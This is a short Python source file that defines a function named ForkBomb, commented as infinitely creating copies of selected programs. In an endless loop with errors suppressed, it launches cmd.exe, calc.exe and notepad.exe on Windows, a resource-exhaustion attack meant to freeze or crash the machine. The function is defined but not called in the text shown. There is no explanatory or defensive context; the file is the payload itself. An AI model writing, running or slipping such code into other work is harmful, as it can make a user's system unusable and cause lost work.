import os


# Infinitely creates copies of selected programs

def ForkBomb():
 while True:
  try:
   os.startfile('cmd.exe')
   os.startfile('calc.exe')
   os.startfile('notepad.exe')
  except:
   pass